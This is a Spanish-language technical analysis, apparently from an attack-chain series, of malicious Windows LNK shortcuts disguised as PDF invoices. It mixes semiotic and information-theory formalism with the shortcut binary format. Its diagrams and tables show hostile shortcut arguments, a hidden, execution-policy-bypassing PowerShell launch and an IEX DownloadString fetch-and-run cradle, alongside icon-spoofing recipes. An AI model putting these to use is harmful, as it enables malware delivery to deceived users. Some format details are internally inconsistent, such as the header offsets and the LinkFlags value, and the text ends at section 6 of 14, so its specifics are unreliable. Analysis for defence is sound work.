# Etapa 2 — El Señuelo: Ingeniería Social Visual y Semiótica Formal

## Documentación Técnica de Nivel APT/Intelligence-Grade

### Análisis Formal del Mecanismo de Decepción, Estructura Binaria LNK, Modelos Cognitivos, y Marcos de Detección

---

## Índice

1. [Resumen Ejecutivo Clasificado](#1-resumen-ejecutivo)
2. [Modelo Semiótico Formal del Engaño Visual en Windows Shell](#2-modelo-semiotico)
3. [Arquitectura del Formato Shell Link Binary (LNK) — Especificación Formal](#3-arquitectura-lnk)
4. [Análisis Algebraico de la Discrepancia Representamen-Objeto](#4-analisis-algebraico)
5. [Teoría de la Información Aplicada: Asimetría de Señal y Ruido Cognitivo](#5-teoria-informacion)
6. [El Subsistema Shell32.dll como Motor de Renderizado de Signos](#6-subsistema-shell32)
7. [Ingeniería del Ocultamiento de Extensión como Mecanismo de Falsificación](#7-ocultamiento-extension)
8. [LNK Stomping: Discrepancia de Parseo y Violación de Invariantes](#8-lnk-stomping)
9. [Modelo Cognitivo del Procesamiento de Signos por el Usuario](#9-modelo-cognitivo)
10. [Superficie de Detección: Formalización y Predicados de Alerta](#10-superficie-deteccion)
11. [Historial de Explotación Documentado y Contexto APT](#11-historial-apts)
12. [Contramedidas: Niveles de Defensa según Modelo de Capas](#12-contramedidas)
13. [Análisis de Variaciones y Mutaciones del Vector](#13-variaciones)
14. [Referencias y Marco Normativo](#14-referencias)

---

## 1. Resumen Ejecutivo

El señuelo LNK constituye el **mecanismo de transición cognitiva** entre el bypass del Mark-of-the-Web (Etapa 1) y la ejecución del código del atacante (Etapa 3). Su función es transformar un archivo ejecutable disfrazado en un signo visual que el subsistema cognitivo del usuario clasifica como "documento inofensivo", eliminando la inspección voluntaria antes de la ejecución.

La decepción opera en dos capas simultáneas: una **capa semiótica** que falsifica la relación entre el representamen (lo que el usuario percibe) y el objeto (lo que el archivo realmente es), y una **capa técnica** que explota discrepancias en el parser de `shell32.dll` para ocultar la verdadera naturaleza del archivo tanto a la inspección visual del usuario como al análisis estático de motores de seguridad.

Formalmente, el engaño se modela como una **inyección en el canal de comunicación** entre el sistema de archivos y el sistema cognitivo del usuario: el atacante reemplaza el signo que el sistema operativo debería presentar (acceso directo a ejecutable con argumentos) por un signo sustituto (documento PDF legítimo), aprovechando tres condiciones habilitantes:

1. **Ocultamiento de extensión** — La configuración por defecto de Windows suprime la extensión `.lnk` de la presentación visual
2. **Icono apropiado** — El formato LNK permite especificar cualquier icono del sistema, independientemente del ejecutable destino
3. **Discrepancia de parseo** — El parser de `shell32.dll` maneja los campos del LNK de forma inconsistente entre visualización y ejecución

Estas tres condiciones se combinan para producir una **superposición de signos** donde el significado percibido ($I(R)$ = "documento PDF") difiere del significado real ($I(O)$ = "ejecutable con argumentos maliciosos"), pero el usuario opera bajo la asunción $I(R) = I(O)$.

---

## 2. Modelo Semiótico Formal del Engaño Visual en Windows Shell

### 2.1 Marco Teórico: Semiótica Triádica de Peirce

**Definición 2.1.1 — Signo como Terna**

Siguiendo la semiótica de Charles Sanders Peirce, un signo es una relación triádica:

$$S = (R, O, I)$$

donde:
- $R$ es el **representamen** — la forma material del signo tal como es percibida (icono de Acrobat + nombre "Factura.pdf" en el Explorador)
- $O$ es el **objeto** — la entidad real a la que el signo se refiere (acceso directo `.lnk` cuyo `Target` es `cmd.exe` con argumentos maliciosos)
- $I$ es el **interpretante** — el significado construido por el intérprete (usuario) a partir del representamen ("documento PDF legítimo y seguro")

La relación triádica es **irreducible**: el signo no existe sin los tres componentes. Un signo funciona correctamente cuando:

$$I(R) \approx I(O)$$

Es decir, el significado construido a partir del representamen se aproxima al significado del objeto real. El engaño ocurre cuando:

$$I(R) \neq I(O) \wedge \text{User assumes } I(R) = I(O)$$

### 2.2 Taxonomía de los Signos en Windows Explorer

El Explorador de Windows presenta cada archivo como un **signo compuesto** con tres canales de información visual:

```
┌─────────────────────────────────────────────────────────────────┐
│          ANATOMÍA DEL SIGNO VISUAL EN WINDOWS EXPLORER          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ┌──────────┐                                                  │
│   │          │  Canal 1: ICONO (Representamen Visual)           │
│   │  [📄]    │  → Extraído de IconLocation en LNK               │
│   │          │  → O del handler registrado para la extensión     │
│   └──────────┘                                                  │
│                                                                 │
│   Factura.pdf                                                   │
│   ├── Canal 2: NOMBRE (Representamen Textual)                   │
│   │   → DisplayName(lnk.Name, HideExt=TRUE)                    │
│   │   → Suprime extensión .lnk si es "conocida"                │
│   │                                                             │
│   └── Canal 3: EXTENSIÓN (Representamen de Tipo)               │
│       → ".pdf" (visible, extensiones mostradas)                 │
│       → "" (suprimida, extensiones ocultas, DEFAULT)            │
│                                                                 │
│   CANAL OCULTO (no visible para el usuario):                    │
│   ├── Target: C:\Windows\System32\cmd.exe                      │
│   ├── Arguments: /c powershell -ep bypass -w hidden -c "..."   │
│   └── WorkingDir: (directorio de trabajo)                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Definición 2.2.1 — Función de Renderizado del Shell**

El Explorador de Windows implementa una **función de renderizado** que transforma un archivo $f$ en un signo visual $S$:

$$\text{Render}: \mathcal{F} \times \text{Config} \rightarrow S$$

donde $\text{Config}$ incluye las configuraciones del sistema (ocultar extensiones, mostrar iconos, tipo de vista). Para un archivo LNK:

$$\text{Render}(lnk, c) = (R_{icon}(lnk),\; R_{name}(lnk, c),\; R_{ext}(lnk, c))$$

donde:
- $R_{icon}(lnk) = \text{ExtractIcon}(\text{IconLocation}(lnk))$ — icono extraído del campo `IconLocation`
- $R_{name}(lnk, c) = \text{DisplayName}(\text{Name}(lnk), c.\text{HideExt})$ — nombre mostrado
- $R_{ext}(lnk, c)$ — extensión mostrada (suprimida si `HideExt=TRUE` y la extensión es "conocida")

### 2.3 Clasificación de la Decepción según el Tipo de Signo

Peirce clasifica los signos según la relación entre representamen y objeto:

| Tipo | Relación R-O | Ejemplo legítimo | Ejemplo en el vector |
|---|---|---|---|
| **Icono** | R se parece a O | Foto de una persona | **Icono de PDF que "se parece" a un PDF** |
| **Índice** | R está conectado causalmente con O | Humo → fuego | Nombre "Factura.pdf" → contexto empresarial |
| **Símbolo** | R convencionalmente representa O | Palabra "gato" → animal | Extensión ".pdf" → tipo documento |

El señuelo LNK explota simultáneamente los tres tipos:

1. **Iconicidad**: El icono de Acrobat Reader es visualmente idéntico al que presentaría un archivo PDF real
2. **Indexicalidad**: El nombre "Factura.pdf" activa una conexión causal con el contexto laboral del usuario
3. **Simbolismo**: La extensión ".pdf" simboliza convencionalmente un formato de documento inofensivo

**Definición 2.3.1 — Decepción Compuesta**

$$\text{Deceit}(S) \iff \underbrace{R_{icon} \sim O_{PDF}}_{\text{Decepción icónica}} \wedge \underbrace{R_{name} \rightarrow O_{trabajo}}_{\text{Decepción indicial}} \wedge \underbrace{R_{ext} \equiv O_{documento}}_{\text{Decepción simbólica}} \wedge \underbrace{O_{real} \neq O_{percibido}}_{\text{Sustitución de objeto}}$$

### 2.4 Diagrama del Modelo Semiótico del Engaño

```
═══════════════════════════════════════════════════════════════════════════
                    MODELO SEMIÓTICO DEL ENGAÑO LNK
═══════════════════════════════════════════════════════════════════════════

  ESTADO LEGÍTIMO (archivo PDF real):
  ┌─────────────────────────────────────────────────────────────┐
  │                                                             │
  │   R = [📄 Icono Acrobat] + "Factura.pdf"                   │
  │                    │                                        │
  │                    │  I(R) = "Documento PDF legítimo"       │
  │                    │                                        │
  │   O = Archivo PDF  │  I(O) = "Documento PDF legítimo"      │
  │                    │                                        │
  │                    ▼                                        │
  │            I(R) = I(O) → SIGNO CORRECTO                    │
  │                                                             │
  └─────────────────────────────────────────────────────────────┘

  ESTADO DECEPCIONADO (archivo LNK malicioso):
  ┌─────────────────────────────────────────────────────────────┐
  │                                                             │
  │   R = [📄 Icono Acrobat] + "Factura.pdf"                   │
  │                    │                                        │
  │                    │  I(R) = "Documento PDF legítimo"       │
  │                    │                                        │
  │   O = cmd.exe /c   │  I(O) = "Ejecutable malicioso         │
  │   powershell ...   │         con argumentos de ataque"      │
  │                    │                                        │
  │                    ▼                                        │
  │         I(R) ≠ I(O) → ENGAÑO (Deceit)                     │
  │         Usuario asume: I(R) = I(O)                          │
  │                                                             │
  │   Condiciones habilitantes:                                 │
  │   ├── HideExt = TRUE  → ".lnk" suprimido                   │
  │   ├── IconLocation   → Acrobat.exe (icono prestado)         │
  │   └── Name           → "Factura.pdf" (nombre falsificado)   │
  │                                                             │
  └─────────────────────────────────────────────────────────────┘

  FORMALMENTE:
  Deceit(S) ⟺ R_icon ∼ O_PDF ∧ R_name → O_trabajo
              ∧ R_ext ≡ O_documento ∧ O_real ≠ O_percibido
              ∧ I(R) ≠ I(O) ∧ User assumes I(R) = I(O)

═══════════════════════════════════════════════════════════════════════════
```

---

## 3. Arquitectura del Formato Shell Link Binary (LNK) — Especificación Formal

### 3.1 Definición del Formato como Estructura Algebraica

El formato Shell Link Binary está especificado por Microsoft en `[MS-SHLLINK]`. Un archivo `.lnk` se modela como una estructura compuesta:

**Definición 3.1.1 — Estructura LNK**

$$\text{LNK} = (H, L, \Pi, E)$$

donde:
- $H$ = **ShellLinkHeader** (76 bytes, obligatorio)
- $L$ = **LinkTargetIDList** (lista de identificadores al destino, condicional)
- $\Pi$ = **LinkInfo** + **StringData** (conjunto de estructuras de información, condicionales)
- $E$ = **ExtraData** (conjunto de bloques de datos adicionales, opcionales)

### 3.2 ShellLinkHeader — Anatomía Completa

**Definición 3.2.1 — ShellLinkHeader**

El header es una estructura fija de 76 bytes:

```
Offset  Size   Field                     Descripción
──────  ────   ──────────────────────    ───────────────────────────────────
0x00    4      HeaderSize                0x0000004C (76 bytes)
0x04    16     LinkCLSID                 00021401-0000-0000-C000-000000000046
0x14    4      LinkFlags                 Bitmask — controla la presencia de campos
0x18    4      FileFlags                 Atributos del archivo destino
0x1C    8      CreationTime              FILETIME de creación
0x24    8      AccessTime                FILETIME de acceso
0x2C    8      WriteTime                 FILETIME de escritura
0x34    4      FileSize                  Tamaño del archivo destino
0x38    4      IconIndex                 Índice del icono en el archivo de iconos
0x3C    4      ShowCommand               Estado de la ventana (SW_*)
0x40    1      HotKey                    Tecla de acceso rápido
0x41    2      Reserved1                 Debe ser 0
0x43    4      Reserved2                 Debe ser 0
0x47    4      Reserved3                 Debe ser 0
```

### 3.3 LinkFlags — El Registro de Control del Parseo

**Definición 3.3.1 — LinkFlags Bitmask**

El campo `LinkFlags` (offset 0x14) es una **máscara de bits** que controla qué estructuras están presentes y cómo se parsean:

| Bit | Valor | Nombre | Estructura controlada | Crítico para decepción |
|---|---|---|---|---|
| 0 | 0x00000001 | HasLinkTargetIDList | LinkTargetIDList presente | ● |
| 1 | 0x00000002 | HasLinkInfo | LinkInfo presente | |
| 2 | 0x00000004 | HasName | Description string presente | |
| 3 | 0x00000008 | HasRelativePath | RelativePath string presente | |
| 4 | 0x00000010 | HasWorkingDir | WorkingDir string presente | ● |
| 5 | 0x00000020 | HasArguments | CommandLineArguments presente | **●●●** |
| 6 | 0x00000040 | HasIconLocation | IconLocation string presente | **●●●** |
| 7 | 0x00000080 | IsUnicode | Strings en formato Unicode | |
| 8 | 0x00000100 | ForceNoLinkInfo | LinkInfo ausente | |
| 9 | 0x00000200 | HasExpString | ExpandoStringBlocks en ExtraData | |
| 10 | 0x00000400 | RunInSeparateProcess | Ejecutar en proceso separado | |
| 11 | 0x00000800 | Unused1 | (Sin uso) | |
| 12 | 0x00001000 | HasDarwinID | DarwinData presente (Windows Installer) | |
| 13 | 0x00002000 | RunAsUser | Ejecutar como usuario diferente | |
| 14 | 0x00004000 | HasExpIconLocation | IconLocation en formato expando | |
| 15 | 0x00008000 | NoPidlAlias | No usar alias PIDL | |
| 16 | 0x00010000 | Unused2 | (Sin uso) | |
| 17 | 0x00020000 | RunWithShimLayer | Ejecutar con shim de compatibilidad | |
| 18 | 0x00040000 | ForceNoLinkTrack | No usar tracking info | |
| 19 | 0x00080000 | EnableTargetMetadata | Metadatos del destino | |
| 20 | 0x00100000 | DisableLinkPathTracking | Deshabilitar tracking | |
| 21 | 0x00200000 | DisableKnownFolderTracking | Deshabilitar tracking de carpeta | |
| 22 | 0x00400000 | DisableKnownFolderAlias | Deshabilitar alias de carpeta | |
| 23 | 0x00800000 | AllowLinkToLink | Permitir LNK a LNK | |
| 24 | 0x01000000 | UnaliasOnSave | Desaliasar al guardar | |
| 25 | 0x02000000 | PreferEnvironmentPath | Preferir ruta de entorno | |
| 26 | 0x04000000 | KeepLocalIDListForUNCTarget | Mantener PIDL local para UNC | |
| 27+ | ... | Reserved | Reservado | |

**Los bits 5 y 6 (HasArguments y HasIconLocation) son los campos críticos** para la decepción. El bit 5 controla si el parser busca argumentos de línea de comandos, y el bit 6 controla si se usa un icono personalizado.

### 3.4 StringData — Los Campos Textuales del Engaño

**Definición 3.4.1 — Estructura StringData**

Las cadenas de texto del LNK se organizan como un conjunto de estructuras condicionales:

```
┌──────────────────────────────────────────────────────────────────┐
│                  StringData (orden de aparición)                  │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ STRING_DATA {                                            │   │
│  │     Description        (si HasName = 1)                  │   │
│  │     RelativePath       (si HasRelativePath = 1)          │   │
│  │     WorkingDir         (si HasWorkingDir = 1)            │   │
│  │     CommandLineArguments (si HasArguments = 1)  ← CLAVE │   │
│  │     IconLocation       (si HasIconLocation = 1) ← CLAVE │   │
│  │ }                                                        │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                  │
│  Formato de cada string:                                         │
│  ┌──────────────────────────────────────────────────────────┐   │
│  │ USHORT  CountCharacters   (número de caracteres)         │   │
│  │ WCHAR[] String            (CountCharacters caracteres)   │   │
│  └──────────────────────────────────────────────────────────┘   │
│                                                                  │
│  NOTA: Si IsUnicode = 0, se usan CHAR en lugar de WCHAR        │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

**Campos relevantes para la decepción:**

| Campo | Función en el engaño | Valor en LNK malicioso |
|---|---|---|
| `Description` | Texto del tooltip al pasar el cursor | Opcional: "Documento PDF" |
| `CommandLineArguments` | Argumentos pasados al Target | `/c powershell -ep bypass -w hidden -c "..."` |
| `IconLocation` | Ruta del archivo que contiene el icono | `C:\Program Files\Adobe\Acrobat DC\Acrobat.exe,0` |

### 3.5 ShowCommand — Control del Estado de Ventana

**Definición 3.5.1 — Valores de ShowCommand**

| Valor | Constante Win32 | Efecto | Uso en engaño |
|---|---|---|---|
| 0x00000001 | `SW_SHOWNORMAL` | Ventana normal | **Más común** — aparece como ejecución normal |
| 0x00000003 | `SW_SHOWMAXIMIZED` | Ventana maximizada | Raro en engaño |
| 0x00000007 | `SW_SHOWMINNOACTIVE` | Minimizada sin foco | Alternativa para ocultar la ventana del LOLBin |

### 3.6 ExtraData — Bloques de Datos Extendidos

**Definición 3.6.1 — Estructura ExtraData**

El bloque ExtraData contiene cero o más estructuras de datos extendidos:

```
ExtraData = {
    SpecialFolderDataBlock     (si presente)
    DarwinDataBlock            (si presente)
    KnownFolderDataBlock       (si presente)
    PropertyStoreDataBlock     (si presente)
    TrackerDataBlock           (si presente)
    ConsensusDataBlock         (si presente)
    ShimLayerDataBlock         (si presente)
    TerminalBlock              (0x00000000 — marcador de fin)
}
```

Cada bloque tiene la estructura:

```
┌──────────────────────────────────┐
│ BlockSize   : DWORD              │  Tamaño total del bloque (incluyendo este campo)
│ BlockSignature : DWORD           │  Identificador del tipo de bloque
│ BlockData   : BYTE[BlockSize-8]  │  Datos específicos del bloque
└──────────────────────────────────┘
```

**Relevancia para LNK Stomping (Sección 8):** Algunos bloques ExtraData pueden contener argumentos de línea de comandos incluso cuando `HasArguments = 0` en el header. Esta discrepancia es la base del "LNK Stomping".

### 3.7 Diagrama de la Estructura Binaria Completa

```
═══════════════════════════════════════════════════════════════════════════
           ESTRUCTURA BINARIA COMPLETA DEL ARCHIVO LNK
           [MS-SHLLINK] Shell Link Binary Format
═══════════════════════════════════════════════════════════════════════════

  Offset    Estructura                    Contenido en LNK malicioso
  ──────    ───────────                   ──────────────────────────
  0x00      ┌─────────────────────────┐
            │ ShellLinkHeader (76B)    │
  0x00      │   HeaderSize = 0x4C     │
  0x04      │   LinkCLSID = {000214..}│
  0x14      │   LinkFlags = 0x67      │ ← HasTargetIDList|HasWorkingDir
            │     = 0110 0111b        │   |HasArguments|HasIconLocation
            │     HasArguments = 1    │   |IsUnicode
            │     HasIconLocation = 1 │
  0x18      │   FileFlags = ...       │
  0x1C      │   CreationTime = ...    │
  0x24      │   AccessTime = ...      │
  0x2C      │   WriteTime = ...       │
  0x34      │   FileSize = ...        │
  0x38      │   IconIndex = 0         │ ← Primer icono de Acrobat.exe
  0x3C      │   ShowCommand = 1       │ ← SW_SHOWNORMAL
  0x40      │   HotKey = 0            │
  0x47      └─────────────────────────┘
  0x4C      ┌─────────────────────────┐
            │ LinkTargetIDList        │
            │   ┌───────────────────┐ │
            │   │ ItemIDList[0]     │ │ ← Desktop
            │   │ ItemIDList[1]     │ │ ← C:\
            │   │ ItemIDList[2]     │ │ ← Windows\
            │   │ ItemIDList[3]     │ │ ← System32\
            │   │ ItemIDList[4]     │ │ ← cmd.exe
            │   │ Terminal (0x00)   │ │
            │   └───────────────────┘ │
            └─────────────────────────┘
  var       ┌─────────────────────────┐
            │ StringData              │
            │   WorkingDir = "C:\"    │
            │   Args = "/c powershell │
            │     -ep bypass -w hidden│
            │     -c IEX(New-Object..│
            │     ).DownloadString(..│
            │     'http://...'"       │
            │   IconLocation =        │
            │     "C:\...\Acrobat.exe │
            │      ,0"                │
            └─────────────────────────┘
  var       ┌─────────────────────────┐
            │ ExtraData               │
            │   TrackerDataBlock      │
            │   PropertyStoreBlock    │
            │   TerminalBlock (0x00)  │
            └─────────────────────────┘

═══════════════════════════════════════════════════════════════════════════
         MAGIC BYTES: 4C 00 00 00 → HeaderSize = 0x4C
         CLSID: 00021401-0000-0000-C000-000000000046
═══════════════════════════════════════════════════════════════════════════
```

---

## 4. Análisis Algebraico de la Discrepancia Representamen-Objeto

### 4.1 Función de Renderizado como Morfismo

**Definición 4.1.1 — Función de Renderizado del Shell**

El Explorador de Windows implementa una función de renderizado que transforma un archivo LNK en un signo visual presentado al usuario:

$$\text{Render}: \text{LNK} \times \text{Config} \rightarrow \text{VisualSign}$$

Para un LNK legítimo (por ejemplo, un acceso directo a Adobe Acrobat), esta función produce:

$$\text{Render}(lnk_{legit}, c) = (\text{AcroRd32.exe icon},\; \text{"Acrobat Reader"},\; \text{".lnk"})$$

Para un LNK malicioso:

$$\text{Render}(lnk_{mal}, c) = (\text{AcroRd32.exe icon},\; \text{"Factura.pdf"},\; \text{""})$$

La clave es que $\text{Render}(lnk_{mal}, c) = \text{Render}(pdf_{real}, c)$ para los tres canales visuales. Es decir, el LNK malicioso produce **el mismo signo visual** que un archivo PDF real.

### 4.2 Formalización de la Inyección de Signo

**Definición 4.2.1 — Inyección de Signo**

El atacante realiza una **inyección en el canal de comunicación** entre el sistema de archivos y el sistema cognitivo del usuario. Sea $\mathcal{V}$ el espacio de signos visuales válidos y $\mathcal{S}: \mathcal{F} \rightarrow \mathcal{V}$ la función de presentación del sistema. La inyección se define como:

$$\exists\, lnk_{mal} \in \mathcal{F}: S(lnk_{mal}) = S(pdf_{real}) \wedge \text{ObjectType}(lnk_{mal}) \neq \text{ObjectType}(pdf_{real})$$

Esto es posible porque $S$ no es inyectiva: múltiples archivos pueden producir el mismo signo visual. El atacante explota la **no-inyectividad** de la función de presentación.

### 4.3 Álgebra de las Funciones de Presentación

**Definición 4.3.1 — Kernel de la Función de Presentación**

El kernel de $S$ (el conjunto de archivos que se presentan idénticamente) es:

$$\ker(S) = \{(f_1, f_2) \in \mathcal{F}^2 \mid S(f_1) = S(f_2)\}$$

En un sistema con `HideExt = TRUE`, el kernel incluye:

$$\ker(S) \supseteq \{(f_1, f_2) \mid f_1.\text{Name} = f_2.\text{Name} \wedge f_1.\text{Ext} \in \text{KnownExts} \wedge f_2.\text{Ext} \in \text{KnownExts}\}$$

Es decir, todos los archivos con el mismo nombre base y extensiones "conocidas" se presentan idénticamente. Esto incluye pares como:

- `("Factura.pdf", "Factura.pdf.lnk")` — el LNK y el PDF se muestran igual
- `("Factura.pdf", "Factura.pdf.exe")` — un EXE y un PDF se muestran igual
- `("Factura.pdf", "Factura.pdf.scr")` — un SCR y un PDF se muestran igual

**Definición 4.3.2 — Dimensión del Espacio de Decepción**

El número de pares de decepción posibles es:

$$|\ker(S)| \geq |\text{KnownExts}| \times |\text{DangerousExts}|$$

donde $\text{DangerousExts} = \{\text{.lnk}, \text{.exe}, \text{.scr}, \text{.com}, \text{.bat}, \text{.cmd}, \text{.ps1}, \text{.vbs}, \text{.hta}, \text{.wsf}\}$

Para Windows 11 con `HideExt = TRUE`:

$$|\ker(S)| \geq 50 \times 10 = 500 \;\text{pares de decepción mínimo}$$

### 4.4 Propiedad de No-Inyectividad como Condición Habilitante

**Teorema 4.4.1 — Condición Necesaria del Engaño**

*El engaño LNK es posible si y solo si la función de presentación $S$ no es inyectiva:*

$$\text{DeceitPossible} \iff \ker(S) \neq \{(f, f) \mid f \in \mathcal{F}\}$$

**Demostración:**

($\Rightarrow$) Si $\text{DeceitPossible}$, entonces existen $lnk_{mal}, pdf_{real}$ tales que $S(lnk_{mal}) = S(pdf_{real})$ pero $lnk_{mal} \neq pdf_{real}$. Por lo tanto $(lnk_{mal}, pdf_{real}) \in \ker(S)$ y $(lnk_{mal}, pdf_{real}) \notin \{(f, f) \mid f \in \mathcal{F}\}$, así que $\ker(S) \neq \{(f, f) \mid f \in \mathcal{F}\}$.

($\Leftarrow$) Si $\ker(S) \neq \{(f, f) \mid f \in \mathcal{F}\}$, entonces existen $f_1 \neq f_2$ con $S(f_1) = S(f_2)$. Si uno de ellos es "peligroso" y el otro "seguro", el atacante puede construir un engaño presentando el archivo peligroso con el signo del seguro.

$\blacksquare$

**Corolario:** Forzar `HideExt = FALSE` (mostrar extensiones) hace que $S$ sea más inyectiva (reduce $|\ker(S)|$), pero no la hace completamente inyectiva, porque el icono y el nombre pueden seguir siendo falsificados.

---

## 5. Teoría de la Información Aplicada: Asimetría de Señal y Ruido Cognitivo

### 5.1 Modelo de Canal de Comunicación Usuario-Sistema

La interacción del usuario con el Explorador de Windows se modela como un **canal de comunicación** con ruido:

```
  Sistema de           Canal Visual           Sistema
  Archivos            (Explorer.exe)          Cognitivo
  ┌─────────┐     ┌──────────────────┐     ┌──────────┐
  │ archivo  │────►│ Render(f,config) │────►│ Percepción│
  │ LNK      │     │                  │     │ del       │
  │          │     │ Ruido:           │     │ usuario   │
  │          │     │ ├── HideExt      │     │           │
  │          │     │ ├── IconLoc      │     │ I(R) = ?  │
  │          │     │ └── Name         │     │           │
  └─────────┘     └──────────────────┘     └──────────┘
```

El atacante controla el **ruido del canal**: modifica los campos del LNK para que la señal recibida por el sistema cognitivo sea "documento PDF" en lugar de "acceso directo malicioso".

### 5.2 Capacidad del Canal y Pérdida de Información

**Definición 5.2.1 — Capacidad del Canal Visual**

La capacidad del canal visual del Explorador está determinada por la cantidad de información que puede transmitir sobre el archivo real. Definimos:

$$C_{visual} = \max_{P(X)} I(X; Y)$$

donde $X$ es el tipo real del archivo y $Y$ es el signo visual percibido.

En un sistema con extensiones visibles y sin icono prestado:

$$C_{full} = H(X) \approx \log_2 |\text{FileTypes}|$$

En un sistema con `HideExt = TRUE`:

$$C_{hidden} = H(X) - H(X \mid Y_{name+icon}) < C_{full}$$

La **pérdida de capacidad** es:

$$\Delta C = C_{full} - C_{hidden} = H(X \mid Y_{name+icon}) - 0 = H(X \mid Y)$$

Para el caso específico de LNK vs. PDF:

$$\Delta C = I(\text{Tipo}; \text{Extensión}) = H(\text{Tipo}) - H(\text{Tipo} \mid \text{Extensión})$$

Cuando la extensión está oculta, $H(\text{Tipo} \mid \text{Extensión})$ se maximiza porque la extensión observada es vacía.

### 5.3 Entropía Cruzada entre Percepción y Realidad

**Definición 5.3.1 — Entropía Cruzada del Engaño**

La entropía cruzada entre la distribución percibida del tipo de archivo $Q$ y la distribución real $P$ es:

$$H(P, Q) = -\sum_{x \in \text{FileTypes}} P(x) \log_2 Q(x)$$

Cuando el engaño es exitoso:

$$Q(\text{PDF}) = 1 \quad \text{(el usuario está 100% seguro de que es un PDF)}$$

$$P(\text{LNK}) = 1 \quad \text{(la realidad es un LNK)}$$

La **divergencia KL** (Kullback-Leibler) entre la creencia del usuario y la realidad es:

$$D_{KL}(P \| Q) = \sum_x P(x) \log_2 \frac{P(x)}{Q(x)} = 1 \cdot \log_2 \frac{1}{0} = +\infty$$

La divergencia infinita indica que la creencia del usuario está **completamente equivocada**: la distancia entre percepción y realidad es máxima.

### 5.4 Información Mutua entre Señal Visual y Tipo Real

**Definición 5.4.1 — Información Mutua Condicionada**

$$I(\text{Tipo}; \text{Visual} \mid \text{HideExt}) = \begin{cases} I(\text{Tipo}; \text{Icon} + \text{Name} + \text{Ext}) & \text{si HideExt = FALSE} \\ I(\text{Tipo}; \text{Icon} + \text{Name}) & \text{si HideExt = TRUE} \end{cases}$$

La diferencia:

$$\Delta I = I(\text{Tipo}; \text{Ext}) = H(\text{Tipo}) - H(\text{Tipo} \mid \text{Ext})$$

representa la **información perdida** por el ocultamiento de extensiones. Para los tipos de archivo que solo se distinguen por su extensión (LNK, PDF, EXE):

$$\Delta I = \log_2 |\mathcal{D}| \;\text{bits}$$

donde $\mathcal{D}$ es el conjunto de extensiones que comparten el mismo icono y nombre base. En el caso LNK/PDF con el mismo icono de Acrobat:

$$\Delta I = \log_2 2 = 1 \;\text{bit}$$

Ese 1 bit — la distinción entre `.pdf` y `.lnk` — es toda la información que separa la percepción correcta del engaño.

---

## 6. El Subsistema Shell32.dll como Motor de Renderizado de Signos

### 6.1 Arquitectura del Pipeline de Renderizado

El proceso por el cual `shell32.dll` transforma un archivo LNK en un signo visual sigue un pipeline de tres fases:

```
═══════════════════════════════════════════════════════════════════════════
            PIPELINE DE RENDERIZADO DEL SHELL (shell32.dll)
═══════════════════════════════════════════════════════════════════════════

  FASE 1: IDENTIFICACIÓN DEL TIPO DE ARCHIVO
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  NtQueryDirectoryFile → WIN32_FIND_DATA                          │
  │       │                                                          │
  │       ├── cFileName = "Factura.pdf.lnk"                          │
  │       └── dwFileAttributes = FILE_ATTRIBUTE_RECALL_ON_DATA_ACCESS│
  │                                          | FILE_ATTRIBUTE_READONLY│
  │                                                                  │
  │  Shell32.dll: DetermineType(cFileName)                           │
  │       │                                                          │
  │       ├── Extensión = ".lnk" → Tipo = SHELLEXECUTE_LNK           │
  │       └── Handler = IShellLink (CLSID {00021401-...})            │
  │                                                                  │
  └──────────────────────────────────────────────────────────────────┘
       │
       ▼
  FASE 2: RESOLUCIÓN DEL SIGNO VISUAL
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  IPersistFile::Load(lnk_path)                                    │
  │       │                                                          │
  │  IShellLink::Resolve()                                           │
  │       │                                                          │
  │       ├── Parsear ShellLinkHeader                                 │
  │       │   └── Leer LinkFlags → determinar campos presentes       │
  │       │                                                          │
  │       ├── Extraer IconLocation                                    │
  │       │   └── "C:\...\Acrobat.exe,0"                             │
  │       │       │                                                  │
  │       │       └── ExtractIcon(Acrobat.exe, 0) → HICON            │
  │       │                                      = [📄 icono PDF]   │
  │       │                                                          │
  │       ├── Extraer Name (Description)                              │
  │       │   └── "Factura.pdf" (o vacío)                            │
  │       │                                                          │
  │       └── Aplicar DisplayName:                                    │
  │           ├── Si HideExt = TRUE:                                  │
  │           │   "Factura.pdf.lnk" → "Factura.pdf"                  │
  │           │   (extensión .lnk suprimida)                          │
  │           └── Si HideExt = FALSE:                                 │
  │               "Factura.pdf.lnk" → "Factura.pdf.lnk"              │
  │                                                                  │
  └──────────────────────────────────────────────────────────────────┘
       │
       ▼
  FASE 3: PRESENTACIÓN AL USUARIO
  ┌──────────────────────────────────────────────────────────────────┐
  │                                                                  │
  │  ListView_DrawItem → Renderizar signo visual compuesto:          │
  │                                                                  │
  │  ┌──────────┐                                                    │
  │  │  [📄]    │  ← Icono de Acrobat (extraído de IconLocation)     │
  │  └──────────┘                                                    │
  │  Factura.pdf   ← DisplayName (extensión .lnk suprimida)          │
  │                                                                  │
  │  === RESULTADO: Signo visual idéntico al de un PDF real ===      │
  │                                                                  │
  └──────────────────────────────────────────────────────────────────┘

═══════════════════════════════════════════════════════════════════════════
```

### 6.2 Función de Extracción de Icono

**Definición 6.2.1 — Resolución de Icono**

La resolución del icono sigue una cadena de prioridad:

$$\text{ResolveIcon}(lnk) = \begin{cases} \text{ExtractIcon}(\text{IconLocation}, \text{IconIndex}) & \text{si HasIconLocation} \\ \text{DefaultIcon}(\text{Target}) & \text{si } \neg\text{HasIconLocation} \wedge \text{HasTargetIDList} \\ \text{Shell\_Generic\_Icon} & \text{en otro caso} \end{cases}$$

El atacante siempre usa `HasIconLocation = TRUE` con una ruta al icono de la aplicación legítima. Esto permite **desacoplar completamente** el icono del destino real:

$$\text{IconLocation}(lnk) = \text{Acrobat.exe} \neq \text{Target}(lnk) = \text{cmd.exe}$$

### 6.3 Tabla de Asignación de Iconos Falsificables

| Icono mostrado | IconLocation usado | Target real | Eficacia de decepción |
|---|---|---|---|
| Adobe Acrobat | `C:\Program Files\Adobe\Acrobat DC\Acrobat.exe,0` | `cmd.exe` | **Máxima** — PDF es el tipo más confiado |
| Microsoft Word | `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0` | `powershell.exe` | **Alta** — documento Office como señuelo |
